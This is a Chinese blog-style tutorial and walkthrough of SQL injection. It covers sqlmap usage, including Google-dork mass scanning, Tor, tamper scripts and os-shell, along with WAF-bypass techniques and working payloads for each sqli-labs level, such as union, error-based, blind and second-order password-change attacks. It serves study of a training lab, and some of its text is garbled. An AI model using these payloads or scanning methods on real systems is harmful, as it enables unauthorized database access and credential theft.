![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216231514473.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTg0MTU5%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216231917200.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTg0MTU5%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216232135918.png)

在勾选后会出现一个文件，里面保存所有的HTTP请求。-
在sqlmap中使用 -r 来指定文件(默认路径是与sqlmap在同一目录下)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216232838736.png)

## Google Hacking注入

可以看到这样是可以批量探测URL，从而节省了时间。-
利用Google Hacking

进行批量化注入(前提是连接到Google)：

payload：

    -g "inurl:\"php?id=1\""
    
        

该payload解析：寻找URL中包含php?id=1的网站进行SQL注入检测，还可以使用-p id啦指定测试参数。

## post注入：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217113145224.png)-
加上\*，或者改为 \*

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217115136643.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217115219689.png)

默认情况下，用于执行HTTP请求的HTTP方法是get，但是可以通过提供在post请求中发送的数据隐式的改为post。这些数据做为参数，被用于SQL注入检测。-
使用–data " "参数，或者使用 --mothed

    -u " " --data="uname=111&passwd=aaa&submit=Submit"
    
        

将id=1作为post请求的参数进行检测。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217102023744.png)

第一次可能需要通过burp来抓包才能进行检测。

有时候，sqlmap需要覆盖默认参数分割符(例如：常用&来分割)，只有分隔符正确，才能正确的处理每个参数，sqlmap才能正常使用。(sqlmap默认是使用&)-
使用 --param-del=“指定分隔符” 覆盖默认参数分隔符。

payload：

–data=" " --param-del=";" -f --dbs --users

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217104041327.png)

## cookie注入：

–cookie “cookie值”

使用场景：-
1.web应用需要cookie验证。-
2.利用cookie注入

## user-agent注入：

在使用 -r 来指定文件时，后缀名也一定不能少。-
\-r post.txt

使用 --user-agent “指定的ua” 来指定ua进行注入。-
还可以使用 --random-agent 随机选择一个user-agent来使用。

在指定的HTTP文件中可以用 \* 来指定注入内容。-
eg：-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217112028376.png)-
这表示user-agent为注入点。从这里开始检测输入。

## HTTP host头注入：

level等于5，才会对主机头进行注入检测。-
也可以使用 \* 来指定注入。

## sqlmap设置代理：

–proxy http(s)😕/ip\[端口号\]

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217115843575.png)-
其中文件内容为：

192.168.11.11:33-
192.168.11.11:33

–proxy-file （指定文件目录）设置多条代理在文件中

## 设置Tor网络：

–tor 开启tor网络 --tor–port tor网络端口 --tor–type tor的类型 --check-tor 检查tor是否可用

    --tor --tor-type=SOCKs5 --check-tor
    
        

要先开始tor网络：-
service tor start

再使用tor网络

## 设置具体的参数：

\-p “具体的参数”-
eg：-p “id,user-agent”

使用_不仅可以在URL设定注入参数：-
eg：127.0.0.1/sql/less_/-
表示less会被sqlmap进行SQL注入的检测。

而且\*还可以标记 -r 的文件中加载的HTTP请求的通用位置。-
还可以标记 -data ，-H的HTTP头值，-cookie -proxy 等都可以

eg：

–cookie ="username=1\*"这个\*表示注入检测点。

–thread 10(设置线程数)

## 设置Temper脚本

删除sqlmap日志文件：-
fm -rf /root/.sql/output/IP地址

\-v 3（会显示所有的发送的payload和数据包）

    --prefix="')"设置前缀为'),--suffix" and (' abc=abc"
    
        

我们输入的payload就会插入到前缀和后缀之中。确保闭合。

sqlmap通过tamper脚本啦哦绕过waf等防护措施，可以在tamper文件夹下找到所有sqlmap自带的tamper脚本。

–tamper “脚本的名称”

–technique 设置具体的SQL注入技术-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217141226879.png)

eg： --technique B 基于布尔的盲注

–union-char 使用特定的字符进行测试-
eg：–union-char 123

–union-cols 12-18 表示测试的字段数为12-18个

设置二次注入：-
–second-order=url

os-shell

需要知道目标文件的绝对路径

sqlmap结合msf

–os-pwn --msf-path “”(如果是默认路径就不需要设置msf的路径)

sqlmap爬取URL，并且对爬取的URL进行自动化注入检测。-
–crawl 3(爬取的深度)

–flush-sessiom(刷新日志文件)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217144142412.png)

## SQL注入常用的过waf技巧：

waf绕过大概分为三类：-
黑盒，白盒，fuzz

1.绕过云waf，可以找到网站的真实地址，或者在同一c段中，其他的网站没有云waf-
1.编码-
eg：-
将转义的符号或语句用URL，base64，hex，gbk等字符集进行编码。-
还可以转换成十六进制。-
将数据库名或表名用十六进制进制表示，可以绕过waf。-
eg：-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217230145600.png)

2.内敛注释，我们可以在注释符中填充内容-
/_ksdkfjkfgsjkdfg5555^&&%%%%_/当其中的数据过大时，就可以绕过waf。-
/_! union select_/,在注释符中的SQL语句，同样会被执行-
3.替换空格-
select/\*\*/from

4.参数污染-
index.php?id=1&id=2,可能只对id=1进行检测，我们就可以利用id=2来进行SQL注入。

5.空白符绕过-
MySQL空白符：-
%0a-
%09 , %0A ,%0B ,/\*\*/等-
%25A0, %25就是%。

6.浮点数

waf对于id=1可以检测，但是对id=1.0，id=1E0,id=\\N无法检测。

注释符：-
;%00

## 一、base challenge

## SQL注入基本知识：

1==.在MySQL中有这样一个数据库information\_schema数据库，永安里存储数据库的元信息。-
其中有三个表schemata(数据库名)，tables(表名)，columns(类名或字段名)

==在schemata表中，schema\_name字段用来存储数据库名==。

==在tables表中，有table\_schema(数据库名)，table\_name(表名)==

==在columns表中，有table\_schema(数据库名)，table\_name(表名)，column\_name(字段名) by\_name(字段名)==

2.MySQL中常用的函数有：-
user():查看当前的MySQL登录用户-
database()：查看当前使用的数据库名-
version():查看当前的MySQL版本

3.注释符：

## 

–空格(不能省，但是可以用 + 来代替)，-
内联注释：/\* \*/ 只有MySQL可以识别，常用来绕过waf

4.GROUP\_CONCAT：-
是一个函数，在连接查询的时候，能让查出的这字段的多个数，按字符拼接的方式存放在一起。(作为一行来显示，相当于使用了limit)

使用方法：select　　group\_concat( \[distinct\] 要连接的字段 \[order by 排序字段 asc/desc \] \[separator ‘分隔符’\] ) from 查询的表

concat()函数-
功能：将多个字符串连接成一个字符串。

语法：concat(str1, str2,…)-
返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。-
5.使用order by 来猜测字段数。

## 在进行时间盲注时，会用到的一些函数：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216153007889.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTg0MTU5%2Csize_16%2Ccolor_FFFFFF%2Ct_70)if(判断条件,1,2)如果条件时对的，那么就会执行1，否则执行二。-
if(ascii(substr(database(),1,1))>100,1,sleep(6))–+

## less-1

    0' union select 1,group_concat(schema_name) from information_schema.schemata,3--+(要放在第三个位置，即password)
    
    schema_name from information_schema.schemata limit 0,1（在union select查询中括号不能乱用，只能在需要使用函数的时候才能用）
    eg：
    schema_name from information_schema.schemata limit 0,1(这是正确的语句)
    但是用括号包裹起来后:(schema_name from information_schema.schemata limit 0,1)这句话就错了。
    正确的括号使用方法：
    union select 1,2,group_concat(concat_ws('~',username,password)) from security.users--+
    ('~':分隔符)
    
        

请求方式 注入类型 拼接方式-
GET 联合、报错、布尔盲注、延时盲注 id=’$id’-
报错解析：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201212144602177.png)-
其中/\\被’ ‘括起来，而最外面的’ ’ 是报错信息自动添加的。

通过报错我们知道，后台的拼接代码大概是

    select 库名 from 表名 where id = ' ' limit 0,1; 
    
        

实际上的源码为：

    $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
    
    支持联合、报错、布尔盲注、延时盲注
    
    if true:
        输出查询内容
    else:
        print_r(mysql_error());
    
        

所以我们注入点在’ '，我们可以通过闭合前面的 ’ ，和注释掉后面的 '，来完成注入。注释语句为：–+,不能使用#.

### 联合查询

payload：

    0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()--+
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216123803692.png)

在这里我们使用group\_concat函数的作用是，能让查出的这字段的多个数，按字符拼接的方式存放在一起。(作为一行来显示，相当于使用了limit 0,1)-
这样就避免对源码中的limit 0,1语句做了过滤，不然直接查询的话的，只会爆出一个字段。-
payload：

`0' union select 1,2, table_name from information_schema.tables where table_schema = database()--`+

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216123910608.png)并且我们可以将where的条件改为十六进制编码，0x十六进制数。可以用编码来绕过waf。

### 报错注入：

常用的报错函数updataxml(),extractvalue(),floor()-
基于函数报错的信息获取(select/insert/update/delect)-
使用报错函数的原因：-
当报错函数在运行的时候传进去表达式或参数不符合它的要求时，它会报错，同时会先将传进去表达式先去执行一下，再把执行后的结果作为报错内容返回给页面。-
使用条件：-
后台没有屏蔽报错信息，并且报错信息会返回给客户端页面。-
其中xpath这个参数错误时，会先执行传入的表达式，再作为错误信息返回。

payload：-
`' and updatexml(1,concat(0x7e,version()),0)#`第一个和第三个参数是可以用数字代替的。-
0x7e表示~，是一个十六进制的编码。-
详解：使用concat(会把传进去的参数组合成一个完整的字符串，然后打印出来，同时concat也可以执行表达式，将执行的结果拼成构成一个完整的字符串，然后输出出来)-
但是，updatexml只会显示一行报错，此时我们就可以使用limit()来限制行数。()第一个参数是位置（从第几行开始),第二个参数是步长(从该行开始到第几行结束，会把自己也给算进去)-
eg:-
(0,1)表示从第一行开始，到该行结束(表示第一行)-
(1,1)表示从第二行开始，到第该行结束(表示第二行)-
(2,1)表示从第三行开始，到第该行结束(表示第三行)

    ' and updatexml(0,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 1,1)),1)#
    
        

在这里只能查一个字段，而不能查两个字段，否则就会查询多个字段，而不能显示一行，从而报错。

extractvalue():

    extractvalue(0,concat(0x7e,version()))
    
        

只有两个参数，第一个参数是doc，第二个参数是xpath(错误就会报错)

floor(取整函数)：-
报错的条件：有concat,floor,group by-
payload:

     ' and (select 2 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#
    
        

注意报错注入使用的连接符是and。-
payload：

    and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216135055791.png)

前面为username ，后面为password用@分开。-
使用concat将(password和username)组合成一个字符串，在来用select 查询-
使用updatexml函数：

    and updatexml(1,concat('^',version(),'^'),1)--+
    
        

### 布尔盲注：

当后台屏蔽了报错信息的时候我们在这时候，就需要利用盲注来实现猜字段了。-
1.基于布尔(正确或者错误)的盲注-
因为要保证前后的错误一致性，所以要使用and连接符。-
eg：-
当页面会返回正确和错误两种页面时，这时候就可以利用布尔盲注了。-
利用：-
and 1=1–+ 和and 1=2–+来达到判断是否存在注入。

payload：

    and length(database())=8--+
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216144002146.png)

如果后面的语句是对的，就会返回一个正确的页面，而不返回正确的页面，就说明，后面的语句是错的。

### 基于时间的盲注

    因为页面连真假都不显示，所以我们只能使用时间来判断，是否有注入。
    eg：
    
        

    1' and sleep(5)#
    
        

当存在注入时，页面会等待5秒才返回网页内容。-
1’ and sleep(length(database())=8)–+-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216144806422.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216144829102.png)-
（正确的时候直接返回，1表示真，不正确的时候等待 5 秒钟，只贴正确的）-
猜测数据库：-
?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))–+-
说明第一位是 s （ascii 码是 115）-
?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))–+-
说明第一位是 e （ascii 码是 101）-
…-
以此类推，我们知道了数据库名字是 security

可以看到因为上面的sleep函数，页面的加载时间延迟了很多。

### sqlmap：

联合查询注入

    sqlmap -u "http://192.168.1.200/sqli-labs/Less-1/?id=1" --dbms=MySQL --random-agent --flush-session --technique=U -v 3 --dbs
    
        

报错注入

    sqlmap -u "http://192.168.1.200/sqli-labs/Less-1/?id=1" --dbms=MySQL --random-agent --flush-session --technique=E -v 3 --dbs
    
        

布尔盲注

    sqlmap -u "http://192.168.1.200/sqli-labs/Less-1/?id=1" --dbms=MySQL --random-agent --flush-session --technique=B -v 3 --dbs
    
        

延时注入

    sqlmap -u "http://192.168.1.200/sqli-labs/Less-1/?id=1" --dbms=MySQL --random-agent --flush-session --technique=T -v 3 --dbs
    
        

## Less-2

    请求方式 get
    
    闭合方式 无闭合
    
    攻击测试 ?id=-1 union select 1,2,version()--+
    
    注入方式 联合，报错，布尔，延时
    
        

## less-3

    请求方式 get
    
    闭合方式 ‘）
    
    攻击测试 ?id=-1 union select 1,2,version()--+
    
    注入方式 联合，报错，布尔，延时
    
        

报错方式：-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216145605572.png)![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216145732398.png)

## less-4

    请求方式 get
    
    闭合方式 ")
    
    攻击测试  ?id=-1") union select 1,2,version()--+
    
    注入方式 联合，报错，布尔，延时
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216145931317.png)

## Less-5

    请求方式 get
    
    闭合方式 '
    
    攻击测试  ?id=1' and updatexml(1,concat('^',version(),'^'),1)--+
    
    注入方式 报错，布尔，延时
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216150353492.png)

## Less-6

    请求方式 get
    
    闭合方式 "
    
    攻击测试  ?id=1" and updatexml(1,concat('^',version(),'^'),1)--+
    
    注入方式 报错，布尔，延时
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216150636954.png)

## less-7

    请求方式 get
    
    闭合方式 '))
    
    攻击测试  ?id=1')) and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))--+
    
    注入方式 布尔，延时
    
        

## Less-8

    请求方式 get
    
    闭合方式 '
    
    攻击测试  ?id=1' and 1=2--+
    
    注入方式 布尔，延时
    
        

## Less-9

    请求方式 get
    
    闭合方式 '
    
    攻击测试  ?id=1' and sleep(4)--+
    
    注入方式 延时
    
        

## Less-10

    请求方式 get
    
    闭合方式 "
    
    攻击测试  ?id=1" and sleep(4)--+
    
    注入方式 延时
    
        

## less-11(post)

请求方式 post

闭合方式 ’

注入方式

POST 数据里面不能有 +，故’–+‘改为’-- '或者使用#注释符

首先使用 admin’ order by 2#猜解除字段数为2

### 联合注入：

payload：

    0' union slect database(),user()#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216204648398.png)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216204630210.png)

### 报错注入：

payload：

    and updatexml(0,concat(0x7e,database()),1)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F202012162055402.png)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216205459781.png)

布尔盲注：-
payload：

    admin' and 1=1#
    admin' and 1=2# 
    
        

根据返回的是否为正确的页面，来判断是否存在注入，和注入的语句是否正确。

and 1=1返回的页面：-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216210711166.png)

and 1=2# 不会返回数据：-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216210810478.png)

时间盲注：

    admin' and if(length(database())=9,1,sleep(5))#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216211203224.png)

### sqlmap：

创建post.txt 文件

使用bp抓包，获取http请求数据包：

\-r ‘文件的路径’

联合注入

sqlmap -r post.txt --dbms=MySQL --random-agent --flush-session --technique=U -v 3

报错注入

sqlmap -r post.txt --dbms=MySQL --random-agent --flush-session --technique=E -v 3

布尔盲注

sqlmap -r post.txt --dbms=MySQL --random-agent --flush-session --technique=B -v 3

延时注入

sqlmap -r post.txt --dbms=MySQL --random-agent --flush-session --technique=T -v 3

## Less-12

    请求方式 post
    
    闭合方式 ")
    
    攻击测试 uname=-1") union select 1,version()#&passwd=&submit=Submit
    
        

注入方式 联合，报错，布尔，延时

## Less-13

    请求方式 post
    
    闭合方式 ')
    
    攻击测试 uname=1') and updatexml(1,concat('^',version(),'^'),1)#&passwd=&submit=Submit
    
        

注入方式 报错，布尔，延时

## Less-14

    请求方式 post
    
    闭合方式 "
    
    攻击测试 uname=1" and updatexml(1,concat('^',database(),'^'),1)#&passwd=&submit=Submit
    
    注入方式 报错，布尔，延时
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217154240142.png)

## Less-15

    请求方式 post
    
    闭合方式 '
    
    攻击测试 uname=admin' and 1=2#&passwd=&submit=Submit
    
    注入方式 布尔，延时
    
        

## Less-16

    请求方式 post
    
    闭合方式 ")
    
    攻击测试 uname=admin") and sleep(4)#&passwd=&submit=Submit
    
    注入方式 延时
    
        

## less-17:

根据提示注入点是password，并且根据测试，username必须正确，错误才会进行回显。-
payload：

    and updatexml(0,concat(0x7e,database()),1)
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217155129878.png)-
Less-18

    请求方式 post
    
    闭合方式 '
    
    注入方式 报错
    
    注入点 user-agent
    
        

payload：

    admin' and updatexml(1,concat(0x7e,database()),1) and '1'='1
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217161308181.png)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217170509108.png)

## Less-19

    请求方式 post
    
    闭合方式 '
    
    注入方式 报错
    
    注入点 referer字段
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217170545811.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217170555700.png)

## Less-20

    请求方式 post
    
    闭合方式 '
    
    注入方式 联合，报错，布尔，延时
    
    注入点 cookie字段
    
    攻击测试 1' union select 1,2,version()#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217170649946.png)

## Less-21

    请求方式 post
    
    闭合方式 ')
    
    注入方式 联合，报错，布尔，延时
    
    注入点 cookie字段（经过Base-64编码）
    
    攻击测试 1') union select 1,2,version()#
    
    Base-64编码之后 
    W5hbWU9MScpIHVuaW9uIHNlbGVjdCAxLDIsdmVyc2lvbigpIw==
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217212750201.png)

## Less-22

请求方式 post

    闭合方式 "
    
    注入方式 报错，布尔，延时
    
    注入点 cookie字段（经过Base-64编码）
    
    攻击测试 1" and updatexml(1,concat('^',database(),'^'),1)#
    
    Base-64编码之后 MSIgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgnXicsZGF0YWJhc2UoKSwnXicpLDEpIw==
    
        

## 高级注入

## 绕过去除注释符：Less-23

    if(isset($_GET['id']))
    {
    $id=$_GET['id'];
     
    //过滤# 和 --+
    $reg = "/#/";
    $reg1 = "/--/";
    $replace = "";
    $id = preg_replace($reg, $replace, $id);
    $id = preg_replace($reg1, $replace, $id);
     
    $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
    $result=mysql_query($sql);
    $row = mysql_fetch_array($result);
    if($row)
    {        
              echo 'Your Login name:'. $row['username'];
              echo 'Your Password:' .$row['password'];
    }
    
        

```
这段代码的意思是：-
#和-- 这两个注释符一旦出现就会被替换成 " "空字符串。-
所以我们不能使用注释符来注释掉后面的 ’ ,而是使用 or ‘1’='1来闭合。-
还可以使用特殊的符号来进行截断: ;%00-
```
payload：

    0' union select 1,database(),2 and '1'='1
    
        

## 绕过去除and和or的SQL注入：less-25

绕过方法：

1.MySQL中的大小写不敏感，大小写一样。

2.MySQL中的16进制与URL编码是一致的。

3.符号和关键字的替换，and 与 && ，or 与 ||等价

4.内敛注释（/\*! 内敛注释 _/）会被当做SQL语句来执行，而多行注释（/_ 多行注释 \*/）不会执行。

5.MySQL会自动识别URL和Hex编码好的内容。

payload：

    ?id=1' || updatexml(0,concat(0x7e,version()),1)--+
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217183357513.png)

sqlmap绕过注释符，利用hex编码：-u “url” --dbs --batch --hex（利用hex编码绕过）

## 二次注入:less-24

eg：-
用户注册，会把username，password作为payload，将注册信息存储在数据库服务器中。-
之后用户要修改密码时，需要将对应的数据从数据库中读取出来，使得第一次输入的信息，作为第二次的payload执行，被称为二次注入。

二次注入 简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入。

攻击思路-
1、创建用户 【admin’#】

2.以用户【admin’#】登录成功

3、修改密码，

UPDATE users SET PASSWORD=‘ p a s s ′ w h e r e u s e r n a m e = ′ pass' where username=' pass′whereusername\=′username’ and password=’$curr\_pass’

此时更新密码的sql语句就变为

UPDATE users SET PASSWORD=‘KaTeX parse error: Expected 'EOF', got '#' at position 29: …sername='admin'#̲' and password=…curr\_pass’

此时实际上我们会将【admin】用户的密码修改

注入语句：admin’ --+这样就可以通过注释掉后面的语句，从而使只要是username为admin的用户就会把password设置为我们输入的密码。

## Less-25a

    区别 闭合方式不同，没有报错信息输出
    
    请求方式 get
    
    闭合方式 数字型
    
    攻击测试
    
    ?id=-1 union select 1,2,3--+
    
    ?id=1 aandnd 1=2--+
    
    注入方式 联合，布尔，延时
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201217205317405.png)

## less-26

过滤规则：

    function blacklist($id)
    {
     
    $id= preg_replace('/or/i',"", $id);                        //strip out OR (non case sensitive)
     
    $id= preg_replace('/and/i',"", $id);                //Strip out AND (non case sensitive)
     
    $id= preg_replace('/[\/\*]/',"", $id);                //strip out /*
     
    $id= preg_replace('/[--]/',"", $id);                //Strip out --
     
    $id= preg_replace('/[#]/',"", $id);                        //Strip out #
     
    $id= preg_replace('/[\s]/',"", $id);                //Strip out spaces
     
    $id= preg_replace('/[\/\\\\]/',"", $id);                //Strip out 斜线
     
    return $id;
     
    }
    
        

可以看到or，and，–，#，空格，/,\\都被替换掉，所以我们就必须绕过这些限制，比如空格可以用()包裹，+，/\*\*/等阿里绕过，其他同理。

    请求方式 get
    
    闭合方式 '
    
    攻击测试 ?id=-1'%a0union%a0select%a01,2,3%a0aandnd%a0'1'='1
    
    注入方式 联合，报错布尔，延时
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201218162112213.png)在这里我们使用%a0,来绕过空格。-
使用;%00来绕过注释符

## Less-26a

    请求方式 get
    
    闭合方式 ')
    
    攻击测试 ?id=-1')%a0union%a0select%a01,2,3%a0aandnd%a0'1'='1
    
    注入方式 联合，报错，布尔，延时
    
        

## less-27

过滤规则：

    function blacklist($id){
    $id= preg_replace('/[\/\*]/',"", $id);           //strip out /*
    $id= preg_replace('/[--]/',"", $id);             //Strip out --.
    $id= preg_replace('/[#]/',"", $id);              //Strip out #.
    $id= preg_replace('/[ +]/',"", $id);             //Strip out spaces.
    $id= preg_replace('/select/m',"", $id);          //Strip out spaces.
    $id= preg_replace('/[ +]/',"", $id);             //Strip out spaces.
    $id= preg_replace('/union/s',"", $id);           //Strip out union
    $id= preg_replace('/select/s',"", $id);          //Strip out select
    $id= preg_replace('/UNION/s',"", $id);           //Strip out UNION
    $id= preg_replace('/SELECT/s',"", $id);          //Strip out SELECT
    $id= preg_replace('/Union/s',"", $id);           //Strip out Union
    $id= preg_replace('/Select/s',"", $id);          //Strip out select
    return $id;
    }
    
        

对于union和select的过滤，我们可以使用双写或者大小写结合的方式进行绕过，或者使用报错，盲注等。

    请求方式 get
    
    闭合方式 '
    
    攻击测试 ?id=-1'uniOn%0bsElect%0b1,2,3 ||'1
    
    注入方式 联合，报错，布尔，延时
    
        

## Less-28

    过滤规则
    function blacklist($id){
    $id= preg_replace('/[\/\*]/',"", $id);                        //strip out /*
    $id= preg_replace('/[--]/',"", $id);                        //Strip out --.
    $id= preg_replace('/[#]/',"", $id);                                //Strip out #.
    $id= preg_replace('/[ +]/',"", $id);                            //Strip out spaces.
    $id= preg_replace('/[ +]/',"", $id);                            //Strip out spaces.
    $id= preg_replace('/union\s+select/i',"", $id);              //Strip out UNION & SELECT.
    return $id;
    }
    
        

这里过滤了空格可以使用前面的编码绕过，过滤了注释，可使用闭合绕过，过滤了UNION+SELECT可以使用双写嵌套绕过也可以使用编码代替+

    请求方式 get
    
    闭合方式 ')
    
    攻击测试 ?id=-1') union%0bselect%0b1,2,3 ||('1')=('2
    
    注入方式 联合，布尔，延时
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201218183701883.png)

## Less-28a

    过滤规则比上一个还少
    
    请求方式 get
    
    闭合方式 ')
    
    攻击测试 ?id=-1') union%0bselect%0b1,2,3 ||('1')=('2
    
    注入方式 联合，布尔，延时](https://img-blog.csdnimg.cn/20201218175220349.png)
    
        

## Less-27a

    请求方式 get
    
    闭合方式 "
    
    攻击测试 ?id=-1"uniOn%0bsElect%0b1,2,3 ||'1
    
    注入方式 联合，布尔，延时
    
        

## less-29

    if(isset($_GET['id'])){
    $qs = $_SERVER['QUERY_STRING']; //获取?后面的值
    $hint=$qs;
    $id1=java_implimentation($qs);
     
    $id=$_GET['id'];
    //再次过滤检查
    whitelist($id1);
     
    $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
     
    if($row){
              echo 'Your Login name:'. $row['username'];
              echo 'Your Password:' .$row['password'];
              }else {
    print_r(mysql_error());
    }
    }
     
    function java_implimentation($query_string){
    $q_s = $query_string;
    // & 作为分隔符，分割字符串
    $qs_array= explode("&",$q_s);
    // 遍历数组
    foreach($qs_array as $key => $value)
    }
     
    $val=substr($value,0,2);
     
    //如果前两位是id
     
    if($val=="id"){
     
    //截取3-30位作为id的值
    $id_value=substr($value,3,30);
    return $id_value;
    break;
    }
     
    function whitelist($input){
    //过滤规则 检测数字
    $match = preg_match("/^\d+$/", $input);
    if($match){}
    else{        
    //不符合规则
    header('Location: hacked.php');
        }
    }
    
        

我们发现有两次过滤whitelist和java\_implimentation

whitelist 过滤是比较严格的，如果 id 不是数字的话就会直接重定向到 hacked.php，这里是没问题的，0而问题出在了前面的函数java\_implimentation($qs)

分析其逻辑，发现在检测道第一个id的时候，因为 return 表示了函数的结束运行，所以这个函数捕捉到 id 的时候就会返回 return $id\_value，这样，如果我们还构造一组id的话，后面的 id 就会绕过函数检测。

请求方式 get

闭合方式 ’

注入方式 联合，布尔，延时

